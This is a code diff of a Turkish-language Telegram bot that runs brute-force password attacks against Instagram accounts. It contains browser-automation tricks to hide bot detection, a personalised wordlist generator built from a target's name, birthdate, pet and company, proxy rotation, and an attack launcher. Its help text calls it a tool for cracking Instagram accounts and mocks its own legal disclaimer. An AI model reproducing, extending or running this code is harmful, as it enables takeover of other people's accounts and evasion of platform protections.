@@ -21,7 +21,6 @@ from urllib.parse import quote
 import os
 from flask import Flask
 from threading import Thread
-import undetected_playwright as up
 from playwright.async_api import async_playwright
 
 # Log ayarları
@@ -187,7 +186,7 @@ class InstagramBruteForce:
             self.browser = await self.playwright.chromium.launch(**launch_options)
             self.page = await self.browser.new_page()
             
-            # Bot tespitini önlemek için ek önlemler :cite[2]:cite[5]:cite[8]
+            # Bot tespitini önlemek için ek önlemler 
             await self.page.add_init_script("""
                 delete navigator.__proto__.webdriver;
                 Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
@@ -397,44 +396,459 @@ class TelegramBot:
                 logger.error(f"Telegram send_message error: {e}")
             return
 
-        # Kullanıcı mesajlarını işleme (önceki kodun aynısı)
-        # ... (Önceki handle_message implementasyonu)
+        if awaiting == 'password':
+            entered_password = update.message.text.strip() if update.message.text else ""
+            if not entered_password:
+                try:
+                    await update.message.reply_text("❌ Boş şifre girilemez! Lütfen bot şifresini gir.")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+                return
+            if entered_password == BOT_PASSWORD:
+                context.user_data['awaiting'] = None
+                welcome_message = "👾 HACKER V3.0 AKTİF! 👾\n🔥 Hoş geldin V.VV SUNAR KEYFİNE BAK 🔥"
+                keyboard = [
+                    [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
+                    [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
+                    [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
+                    [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
+                    [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
+                    [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
+                    [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')]
+                ]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+                try:
+                    await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode='Markdown')
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+                    await update.message.reply_text("❌ Hoş geldin mesajı gönderilirken hata oluştu, lütfen /start ile tekrar dene!")
+            else:
+                try:
+                    await update.message.reply_text("❌ Yanlış şifre! Tekrar dene.")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+                return
+        elif awaiting == 'username':
+            if not update.message.text or not update.message.text.strip():
+                try:
+                    await update.message.reply_text("❌ Boş kullanıcı adı girilemez! Lütfen geçerli bir kullanıcı adı gir.")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+                return
+            username = update.message.text.strip()
+            if len(username) > 30:  # Instagram kullanıcı adı sınırı
+                try:
+                    await update.message.reply_text("❌ Kullanıcı adı 30 karakterden uzun olamaz!")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+                return
+            self.user_data[user_id]['username'] = username
+            try:
+                await update.message.reply_text(f"✅ Kullanıcı adı ayarlandı: {self.user_data[user_id]['username']}")
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+        elif awaiting == 'password_file':
+            if update.message.document:
+                file = await update.message.document.get_file()
+                file_path = f"passwords_{user_id}.txt"
+                await file.download_to_drive(file_path)
+                # Dosyayı oku ve şifreleri kontrol et
+                try:
+                    with open(file_path, 'r', encoding='utf-8') as f:
+                        passwords = [line.strip() for line in f if line.strip() and len(line.strip()) <= 512]
+                    if not passwords:
+                        try:
+                            await update.message.reply_text("❌ Şifre listesi boş veya geçersiz! Lütfen geçerli bir .txt dosyası yükle.")
+                            os.remove(file_path)
+                        except TelegramError as e:
+                            logger.error(f"Telegram send_message error: {e}")
+                        return
+                    self.user_data[user_id]['password_file'] = file_path
+                    try:
+                        await update.message.reply_text(f"✅ Şifre listesi yüklendi! ({len(passwords)} şifre)")
+                    except TelegramError as e:
+                        logger.error(f"Telegram send_message error: {e}")
+                except Exception as e:
+                    try:
+                        await update.message.reply_text(f"❌ Dosya okunamadı: {str(e)}")
+                        os.remove(file_path)
+                    except TelegramError as e:
+                        logger.error(f"Telegram send_message error: {e}")
+                    return
+            else:
+                try:
+                    await update.message.reply_text("❌ Lütfen bir .txt dosyası yükle!")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+                return
+        elif awaiting == 'proxy_file':
+            if update.message.document:
+                file = await update.message.document.get_file()
+                file_path = f"proxies_{user_id}.txt"
+                await file.download_to_drive(file_path)
+                self.user_data[user_id]['proxy_file'] = file_path
+                try:
+                    await update.message.reply_text("✅ Proxy listesi yüklendi!")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+            else:
+                try:
+                    await update.message.reply_text("❌ Lütfen bir .txt dosyası yükle!")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+                return
+        elif awaiting == 'timeout':
+            if not update.message.text or not update.message.text.strip():
+                try:
+                    await update.message.reply_text("❌ Boş timeout değeri girilemez! Lütfen geçerli bir sayı gir.")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+                return
+            try:
+                timeout = int(update.message.text)
+                if 60 <= timeout <= 7200:
+                    self.user_data[user_id]['timeout'] = timeout
+                    try:
+                        await update.message.reply_text(f"✅ Timeout ayarlandı: {timeout} saniye")
+                    except TelegramError as e:
+                        logger.error(f"Telegram send_message error: {e}")
+                else:
+                    try:
+                        await update.message.reply_text("❌ Timeout 60-7200 saniye arasında olmalı!")
+                    except TelegramError as e:
+                        logger.error(f"Telegram send_message error: {e}")
+            except ValueError:
+                try:
+                    await update.message.reply_text("❌ Lütfen geçerli bir sayı gir!")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+                return
+        elif awaiting == 'generate_firstname':
+            firstname = update.message.text.strip() if update.message.text else ""
+            if len(firstname) > 20:
+                try:
+                    await update.message.reply_text("❌ Ad 20 karakterden uzun olamaz!")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+                return
+            self.user_data[user_id]['password_profile']['firstname'] = firstname
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_lastname')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            try:
+                await update.message.reply_text("📝 Soyadı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
+                context.user_data['awaiting'] = 'generate_lastname'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+            return
+        elif awaiting == 'generate_lastname':
+            lastname = update.message.text.strip() if update.message.text else ""
+            if len(lastname) > 20:
+                try:
+                    await update.message.reply_text("❌ Soyad 20 karakterden uzun olamaz!")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+                return
+            self.user_data[user_id]['password_profile']['lastname'] = lastname
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_birthdate')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            try:
+                await update.message.reply_text("📝 Doğum tarihi gir (DDMMYYYY, ör: 05071978, boş bırakmak için butona bas):", reply_markup=reply_markup)
+                context.user_data['awaiting'] = 'generate_birthdate'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+            return
+        elif awaiting == 'generate_birthdate':
+            birthdate = update.message.text.strip() if update.message.text else ""
+            if birthdate and (len(birthdate) != 8 or not birthdate.isdigit()):
+                try:
+                    await update.message.reply_text("❌ Doğum tarihi 8 haneli olmalı (DDMMYYYY)! Tekrar dene:")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+                return
+            self.user_data[user_id]['password_profile']['birthdate'] = birthdate
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_pet')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            try:
+                await update.message.reply_text("📝 Evcil hayvan adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
+                context.user_data['awaiting'] = 'generate_pet'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+            return
+        elif awaiting == 'generate_pet':
+            pet = update.message.text.strip() if update.message.text else ""
+            if len(pet) > 20:
+                try:
+                    await update.message.reply_text("❌ Evcil hayvan adı 20 karakterden uzun olamaz!")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+                return
+            self.user_data[user_id]['password_profile']['pet'] = pet
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_company')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            try:
+                await update.message.reply_text("📝 Şirket adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
+                context.user_data['awaiting'] = 'generate_company'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+            return
+        elif awaiting == 'generate_company':
+            company = update.message.text.strip() if update.message.text else ""
+            if len(company) > 20:
+                try:
+                    await update.message.reply_text("❌ Şirket adı 20 karakterden uzun olamaz!")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+                return
+            self.user_data[user_id]['password_profile']['company'] = company
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_keywords')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            try:
+                await update.message.reply_text("📝 Ek anahtar kelimeler gir (virgülle ayır, ör: hacker,juice, boş bırakmak için butona bas):", reply_markup=reply_markup)
+                context.user_data['awaiting'] = 'generate_keywords'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+            return
+        elif awaiting == 'generate_keywords':
+            keywords = update.message.text.strip() if update.message.text else ""
+            keyword_list = [k.strip() for k in keywords.split(',') if k.strip()] if keywords else []
+            if any(len(k) > 20 for k in keyword_list):
+                try:
+                    await update.message.reply_text("❌ Her anahtar kelime 20 karakterden kısa olmalı!")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+                return
+            self.user_data[user_id]['password_profile']['keywords'] = keyword_list
+            keyboard = [
+                [InlineKeyboardButton("Evet", callback_data='leet_yes'), InlineKeyboardButton("Hayır", callback_data='leet_no')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            try:
+                await update.message.reply_text("🔢 Leet mode? (ör: leet → 1337)", reply_markup=reply_markup)
+                context.user_data['awaiting'] = 'generate_leet'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+            return
+
+        context.user_data['awaiting'] = None
+        keyboard = [
+            [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
+            [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
+            [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
+            [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
+            [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
+            [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
+            [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        try:
+            await update.message.reply_text("➡️ Başka ne yapmak istersin?", reply_markup=reply_markup)
+        except TelegramError as e:
+            logger.error(f"Telegram send_message error: {e}")
 
     async def button(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        # Buton işleyici (önceki kodun aynısı)
-        # ... (Önceki button implementasyonu)
+        query = update.callback_query
+        await query.answer()
+        user_id = query.from_user.id
+        self._initialize_user_data(user_id)
+
+        if query.data == 'set_username':
+            try:
+                await query.message.reply_text("🎯 Lütfen Instagram kullanıcı adını gir:")
+                context.user_data['awaiting'] = 'username'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+        elif query.data == 'set_password_file':
+            try:
+                await query.message.reply_text("📜 Lütfen şifre listesi dosyasını (.txt) yükle:")
+                context.user_data['awaiting'] = 'password_file'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+        elif query.data == 'set_proxy_file':
+            try:
+                await query.message.reply_text("🌐 Lütfen proxy listesi dosyasını (.txt) yükle (isteğe bağlı):")
+                context.user_data['awaiting'] = 'proxy_file'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+        elif query.data == 'set_timeout':
+            try:
+                await query.message.reply_text("⏰ Lütfen timeout süresini (saniye) gir (60-7200 arası):")
+                context.user_data['awaiting'] = 'timeout'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+        elif query.data == 'generate_password_list':
+            try:
+                await query.message.reply_text("🔑 Şifre listesi oluşturmak için bilgileri gir. Adı gir (boş bırakmak için butona bas):")
+                context.user_data['awaiting'] = 'generate_firstname'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+        elif query.data == 'leet_yes':
+            self.user_data[user_id]['password_profile']['leetmode'] = True
+            keyboard = [
+                [InlineKeyboardButton("Evet", callback_data='spechars_yes'), InlineKeyboardButton("Hayır", callback_data='spechars_no')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            try:
+                await query.message.reply_text("🔣 Özel karakterler eklemek ister misiniz? (ör: !, @, #)", reply_markup=reply_markup)
+                context.user_data['awaiting'] = 'generate_spechars'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+        elif query.data == 'leet_no':
+            self.user_data[user_id]['password_profile']['leetmode'] = False
+            keyboard = [
+                [InlineKeyboardButton("Evet", callback_data='spechars_yes'), InlineKeyboardButton("Hayır", callback_data='spechars_no')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            try:
+                await query.message.reply_text("🔣 Özel karakterler eklemek ister misiniz? (ör: !, @, #)", reply_markup=reply_markup)
+                context.user_data['awaiting'] = 'generate_spechars'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+        elif query.data == 'spechars_yes':
+            self.user_data[user_id]['password_profile']['spechars'] = True
+            keyboard = [
+                [InlineKeyboardButton("Evet", callback_data='randnum_yes'), InlineKeyboardButton("Hayır", callback_data='randnum_no')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            try:
+                await query.message.reply_text("🔢 Rastgele sayılar eklemek ister misiniz? (ör: 01, 99)", reply_markup=reply_markup)
+                context.user_data['awaiting'] = 'generate_randnum'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+        elif query.data == 'spechars_no':
+            self.user_data[user_id]['password_profile']['spechars'] = False
+            keyboard = [
+                [InlineKeyboardButton("Evet", callback_data='randnum_yes'), InlineKeyboardButton("Hayır", callback_data='randnum_no')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            try:
+                await query.message.reply_text("🔢 Rastgele sayılar eklemek ister misiniz? (ör: 01, 99)", reply_markup=reply_markup)
+                context.user_data['awaiting'] = 'generate_randnum'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+        elif query.data == 'randnum_yes':
+            self.user_data[user_id]['password_profile']['randnum'] = True
+            await self.generate_password_file(query, user_id)
+        elif query.data == 'randnum_no':
+            self.user_data[user_id]['password_profile']['randnum'] = False
+            await self.generate_password_file(query, user_id)
+        elif query.data == 'start_attack':
+            await self.start_attack(update, context)
+        elif query.data == 'skip_lastname':
+            self.user_data[user_id]['password_profile']['lastname'] = ''
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_birthdate')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            try:
+                await query.message.reply_text("📝 Doğum tarihi gir (DDMMYYYY, ör: 05071978, boş bırakmak için butona bas):", reply_markup=reply_markup)
+                context.user_data['awaiting'] = 'generate_birthdate'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+        elif query.data == 'skip_birthdate':
+            self.user_data[user_id]['password_profile']['birthdate'] = ''
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_pet')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            try:
+                await query.message.reply_text("📝 Evcil hayvan adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
+                context.user_data['awaiting'] = 'generate_pet'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+        elif query.data == 'skip_pet':
+            self.user_data[user_id]['password_profile']['pet'] = ''
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_company')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            try:
+                await query.message.reply_text("📝 Şirket adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
+                context.user_data['awaiting'] = 'generate_company'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+        elif query.data == 'skip_company':
+            self.user_data[user_id]['password_profile']['company'] = ''
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_keywords')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            try:
+                await query.message.reply_text("📝 Ek anahtar kelimeler gir (virgülle ayır, ör: hacker,juice, boş bırakmak için butona bas):", reply_markup=reply_markup)
+                context.user_data['awaiting'] = 'generate_keywords'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+        elif query.data == 'skip_keywords':
+            self.user_data[user_id]['password_profile']['keywords'] = []
+            keyboard = [
+                [InlineKeyboardButton("Evet", callback_data='leet_yes'), InlineKeyboardButton("Hayır", callback_data='leet_no')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            try:
+                await query.message.reply_text("🔢 Leet mode? (ör: leet → 1337)", reply_markup=reply_markup)
+                context.user_data['awaiting'] = 'generate_leet'
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+        elif query.data == 'how_to_use':
+            how_to_use_message = (
+                "📖 *Botu Nasıl Kullanırım?*\n\n"
+                "👾 V.VV SUNAR HACKER V3.0 ile Instagram hesaplarını kırmak çok kolay! 🔥\n"
+                "⚠️ *Yasal Uyarı*: Bu botu sadece kendi hesabın veya izinli testler için kullan! hahah şska be ne yapıyorsan yap senin sorunun! 😎\n\n"
+                "*Adım Adım Kullanım:*\n"
+                "1. *Kullanıcı Adı Gir* 🎯: Hedef Instagram kullanıcı adını yaz.\n"
+                "2. *Şifre Listesi Yükle veya Oluştur* 📜🔑:\n"
+                "   - *Yükle*: Hazır bir .txt dosyasında şifre listeni yükle (her satır bir şifre, max 512 karakter).\n"
+                "   - *Oluştur*: Ad, soyad, doğum tarihi, evcil hayvan adı, şirket adı veya anahtar kelimeler girerek kişiselleştirilmiş şifre listesi yap. Leet mode (ör: leet → 1337), özel karakterler (!@#) ve rastgele sayılar (01-99) ekleyebilirsin. Liste hazır olunca .txt olarak indirilecek!\n"
+                "3. *Proxy Listesi Yükle* 🌐 (İsteğe bağlı): Daha güvenli test için proxy listesi (.txt) yükle.\n"
+                "4. *Timeout Ayarla* ⏰: İşlemin ne kadar süreceğini (60-7200 saniye) belirle.\n"
+                "5. *Saldırıyı Başlat* 🚀: Her şey hazır olunca brute-force'u başlat. İşlem bitince rapor alacaksın:\n"
+                "   - Denenen şifre sayısı\n"
+                "   - Hata alınan şifreler (doğru olabilir, manuel kontrol et)\n\n"
+                "*💡 İpuçları*:\n"
+                "- Boş bırakmak için her adımda *Boş Bırak* butonunu kullan.\n"
+                "- Şifre listesi oluştururken çok fazla kelime ekleme, yoksa liste devasa olur! 😅\n"
+                "- Hata alırsan, /start ile yeniden başla.\n"
+                "- Loglar ve hata alınan şifreler *instagram_response.json* dosyasında saklanır.\n\n"
+                "*🚀 Hadi Başla!* Menüden bir seçenek seç ve keyfine bak! 😜"
+            )
+            keyboard = [
+                [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
+                [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
+                [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
+                [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
+                [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
+                [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            try:
+                await query.message.reply_text(how_to_use_message, reply_markup=reply_markup, parse_mode='Markdown')
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+                await query.message.reply_text("❌ Kullanım kılavuzu gönderilirken hata oluştu, lütfen tekrar dene!")
+        else:
+            try:
+                await query.message.reply_text("❌ Geçersiz işlem! Lütfen /start ile yeniden başla.")
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
 
     async def generate_password_file(self, query: Update, user_id: int):
+        profile = self.user_data[user_id]['password_profile']
+        wordlist = self.password_generator.generate_wordlist(profile)
+        file_path = f"passwords_{user_id}.txt"
+        with open(file_path, 'w', encoding='utf-8') as f:
+            f.write('\n'.join(wordlist))
+        self.user_data[user_id]['password_file'] = file_path
         try:
-            # Kullanıcı profilini al
-            profile = self.user_data[user_id]['password_profile']
-            if not any([profile['firstname'], profile['lastname'], profile['birthdate'], 
-                        profile['pet'], profile['company'], profile['keywords']]):
-                await query.message.reply_text("❌ Lütfen önce profil bilgilerini girin!")
-                return
-
-            # Şifre listesini oluştur
-            wordlist = self.password_generator.generate_wordlist(profile)
-            if not wordlist:
-                await query.message.reply_text("❌ Şifre listesi oluşturulamadı, profil bilgileri yetersiz!")
-                return
-            
-            # Şifre listesini dosyaya kaydet
-            password_file = f"wordlist_{user_id}.txt"
-            with open(password_file, 'w', encoding='utf-8') as f:
-                for word in wordlist:
-                    f.write(word + '\n')
-            
-            self.user_data[user_id]['password_file'] = password_file
-            await query.message.reply_text(f"✅ Şifre listesi oluşturuldu: {len(wordlist)} şifre")
-            
-            # Dosyayı Telegram üzerinden gönder
-            with open(password_file, 'rb') as f:
-                await query.message.reply_document(document=InputFile(f, filename=f"wordlist_{user_id}.txt"))
-        
-        except Exception as e:
-            logger.error(f"Şifre listesi oluşturma hatası: {str(e)}")
-            await query.message.reply_text(f"❌ Şifre listesi oluşturulamadı: {str(e)}")
+            await query.message.reply_text(f"✅ Şifre listesi oluşturuldu! {len(wordlist)} şifre kaydedildi.")
+            await query.message.reply_document(document=InputFile(file_path, filename='generated_passwords.txt'))
+        except TelegramError as e:
+            logger.error(f"Telegram send_document error: {e}")
+            await query.message.reply_text("❌ Şifre listesi gönderilirken hata oluştu!")
+        keyboard = [
+            [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
+            [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
+            [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
+            [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
+            [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
+            [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
+            [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        try:
+            await query.message.reply_text("➡️ Başka ne yapmak istersin?", reply_markup=reply_markup)
+        except TelegramError as e:
+            logger.error(f"Telegram send_message error: {e}")
 
     async def start_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
@@ -453,7 +867,6 @@ class TelegramBot:
                 logger.error(f"Telegram send_message error: {e}")
             return
 
-        # Gerekli kontroller ve veri hazırlığı
         if not self.user_data[user_id]['username']:
             await query.message.reply_text("❌ Lütfen önce kullanıcı adı gir!")
             return
